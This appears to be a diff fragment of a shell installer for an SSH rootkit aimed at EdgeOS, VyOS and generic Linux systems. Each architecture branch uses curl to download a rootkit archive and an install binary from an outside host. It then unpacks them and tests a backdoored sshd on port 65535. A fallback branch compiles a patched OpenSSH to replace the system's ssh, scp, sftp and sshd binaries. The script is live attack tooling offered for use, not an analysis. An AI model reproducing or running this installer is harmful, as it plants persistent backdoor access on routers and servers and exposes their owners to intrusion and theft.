+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;rk&nbsp;test&nbsp;&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod&nbsp;+x&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;mzxf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maindir=`pwd`&nbsp;;&nbsp;rkdir=&quot;$maindir/$rk&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$rkdir&nbsp;;&nbsp;./run&nbsp;test&nbsp;$rk&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rktest&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rktest
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;test&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rktest).&nbsp;please&nbsp;manually&nbsp;check:&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rkdir/$rk/test-sshd&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;telnet&nbsp;127.0.0.1&nbsp;65535&nbsp;&nbsp;OR&nbsp;&nbsp;ssh&nbsp;root@127.0.0.1&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killall&nbsp;-9&nbsp;test-sshd&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;After&nbsp;checking,&nbsp;run&nbsp;the&nbsp;full&nbsp;install:&nbsp;./p2&nbsp;&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+
+elif&nbsp;[&nbsp;&quot;$arch&quot;&nbsp;==&nbsp;&quot;mips&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rk=&quot;edgeos&quot;&nbsp;;&nbsp;echo&nbsp;&quot;$rk&quot;&nbsp;&gt;&nbsp;1tempfiles/rk.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;...&quot;&nbsp;&gt;&nbsp;1tempfiles/side_files_dir.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;$rk.tgz&nbsp;found.&nbsp;downloading&nbsp;rk&nbsp;&amp;&nbsp;install&nbsp;file&nbsp;(p2)&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;$rk.tgz&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;p2&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;rk&nbsp;test&nbsp;&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod&nbsp;+x&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;mzxf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maindir=`pwd`&nbsp;;&nbsp;rkdir=&quot;$maindir/$rk&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$rkdir&nbsp;;&nbsp;./run&nbsp;test&nbsp;$rk&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rktest&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rktest
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;test&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rktest).&nbsp;please&nbsp;manually&nbsp;check:&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rkdir/$rk/test-sshd&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;telnet&nbsp;127.0.0.1&nbsp;65535&nbsp;&nbsp;OR&nbsp;&nbsp;ssh&nbsp;root@127.0.0.1&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killall&nbsp;-9&nbsp;test-sshd&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;After&nbsp;checking,&nbsp;run&nbsp;the&nbsp;full&nbsp;install:&nbsp;./p2&nbsp;&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+
+elif&nbsp;[&nbsp;!&nbsp;-z&nbsp;&quot;$(uname&nbsp;-a|grep&nbsp;vyos)&quot;&nbsp;]&nbsp;&amp;&amp;&nbsp;[&nbsp;&quot;$arch&quot;&nbsp;==&nbsp;&quot;x86_64&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rk=&quot;vyos64&quot;&nbsp;;&nbsp;echo&nbsp;&quot;$rk&quot;&nbsp;&gt;&nbsp;1tempfiles/rk.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;...&quot;&nbsp;&gt;&nbsp;1tempfiles/side_files_dir.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;$rk.tgz&nbsp;found.&nbsp;downloading&nbsp;rk&nbsp;&amp;&nbsp;install&nbsp;file&nbsp;(p2)&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;$rk.tgz&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;p2&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;rk&nbsp;test&nbsp;&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod&nbsp;+x&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;mzxf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maindir=`pwd`&nbsp;;&nbsp;rkdir=&quot;$maindir/$rk&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$rkdir&nbsp;;&nbsp;./run&nbsp;test&nbsp;$rk&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rktest&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rktest
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;test&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rktest).&nbsp;please&nbsp;manually&nbsp;check:&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rkdir/$rk/test-sshd&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;telnet&nbsp;127.0.0.1&nbsp;65535&nbsp;&nbsp;OR&nbsp;&nbsp;ssh&nbsp;root@127.0.0.1&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killall&nbsp;-9&nbsp;test-sshd&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;After&nbsp;checking,&nbsp;run&nbsp;the&nbsp;full&nbsp;install:&nbsp;./p2&nbsp;&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+
+elif&nbsp;[&nbsp;!&nbsp;-z&nbsp;&quot;$(uname&nbsp;-a|grep&nbsp;vyos)&quot;&nbsp;]&nbsp;&amp;&amp;&nbsp;[&nbsp;&quot;$arch&quot;&nbsp;==&nbsp;&quot;i686&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rk=&quot;vyos&quot;&nbsp;;&nbsp;echo&nbsp;&quot;$rk&quot;&nbsp;&gt;&nbsp;1tempfiles/rk.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;...&quot;&nbsp;&gt;&nbsp;1tempfiles/side_files_dir.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;$rk.tgz&nbsp;found.&nbsp;downloading&nbsp;rk&nbsp;&amp;&nbsp;install&nbsp;file&nbsp;(p2)&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;$rk.tgz&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;p2&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;rk&nbsp;test&nbsp;&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod&nbsp;+x&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;mzxf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maindir=`pwd`&nbsp;;&nbsp;rkdir=&quot;$maindir/$rk&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$rkdir&nbsp;;&nbsp;./run&nbsp;test&nbsp;$rk&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rktest&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rktest
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;test&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rktest).&nbsp;please&nbsp;manually&nbsp;check:&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rkdir/$rk/test-sshd&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;telnet&nbsp;127.0.0.1&nbsp;65535&nbsp;&nbsp;OR&nbsp;&nbsp;ssh&nbsp;root@127.0.0.1&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killall&nbsp;-9&nbsp;test-sshd&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;After&nbsp;checking,&nbsp;run&nbsp;the&nbsp;full&nbsp;install:&nbsp;./p2&nbsp;&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+
+
+else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;not&nbsp;found&quot;&nbsp;#&nbsp;red
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;trying&nbsp;to&nbsp;install&nbsp;files&nbsp;needed&nbsp;for&nbsp;default&nbsp;kit&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;-f&nbsp;/usr/bin/yum&nbsp;]&nbsp;;&nbsp;then&nbsp;yum&nbsp;install&nbsp;-y&nbsp;gcc&nbsp;make&nbsp;libgcrypt-devel&nbsp;zlib-devel&nbsp;openssl-devel&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;-f&nbsp;/usr/bin/apt-get&nbsp;]&nbsp;;&nbsp;then&nbsp;apt-get&nbsp;update&nbsp;;&nbsp;apt-get&nbsp;install&nbsp;-y&nbsp;gcc&nbsp;make&nbsp;libgcrypt11-dev&nbsp;zlib1g-dev&nbsp;libssl-dev&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;press&nbsp;any&nbsp;key&nbsp;to&nbsp;download&nbsp;default&nbsp;rk&nbsp;kit&nbsp;or&nbsp;CTRL+c&nbsp;to&nbsp;exit&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read&nbsp;a
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rk=&quot;default&quot;&nbsp;;&nbsp;echo&nbsp;&quot;$rk&quot;&nbsp;&gt;&nbsp;1tempfiles/rk.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;.unix&quot;&nbsp;&gt;&nbsp;1tempfiles/side_files_dir.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;downloading&nbsp;default&nbsp;rk&nbsp;kit&nbsp;&amp;&nbsp;install&nbsp;file&nbsp;(p2)&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/default.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;$rk.tgz&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;p2&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;trying&nbsp;to&nbsp;make&nbsp;new&nbsp;rk&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;mzxf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maindir=`pwd`&nbsp;;&nbsp;rkdir=&quot;$maindir/$rk&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$rkdir
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;1tempfiles/*
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;zxf&nbsp;openssh-5.9p1-cu-patch-SSHD-eu.tgz&nbsp;-C&nbsp;1tempfiles/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;1tempfiles/openssh-5.9p1
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;./configure&nbsp;--prefix=/usr&nbsp;--sysconfdir=/etc/ssh
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;make
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;sshd&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;failed&nbsp;to&nbsp;make&nbsp;new&nbsp;rk.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;../../default/ssh&nbsp;;&nbsp;mv&nbsp;ssh&nbsp;../../default/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;../../default/scp&nbsp;;&nbsp;mv&nbsp;scp&nbsp;../../default/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;../../default/sftp&nbsp;;&nbsp;mv&nbsp;sftp&nbsp;../../default/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;../../default/sshd-*&nbsp;;&nbsp;mv&nbsp;sshd&nbsp;../../default/sshd-eu
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;../..&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;1tempfiles/*&nbsp;&nbsp;###&nbsp;acum&nbsp;sunt&nbsp;in&nbsp;$rkdir
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$maindir
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;rk&nbsp;test&nbsp;&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod&nbsp;+x&nbsp;p2
